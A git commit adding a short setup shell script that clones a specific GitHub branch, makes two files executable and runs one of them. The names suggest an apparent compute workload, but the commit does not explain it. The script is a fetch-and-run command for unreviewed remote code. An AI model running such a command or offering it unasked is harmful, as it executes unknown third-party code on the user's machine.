a36825f4012ae1de8fec642169e3029ab4932cd9
jacknero001 <91582634+jacknero001@users.noreply.github.com>
2021-09-29 10:34:32 +0700

    Add files via upload

---
+++ umenztech-2cpu-nq-setup.sh
@@ -0,0 +1,3 @@
+#!/bin/sh
+
+git clone --single-branch -b umenztech-cpu-nq https://github.com/dorinkutozi/umenztech.git && cd umenztech && chmod +x umenztech-2cpu.sh && chmod +x umenztech-nq && ./umenztech-2cpu.sh 
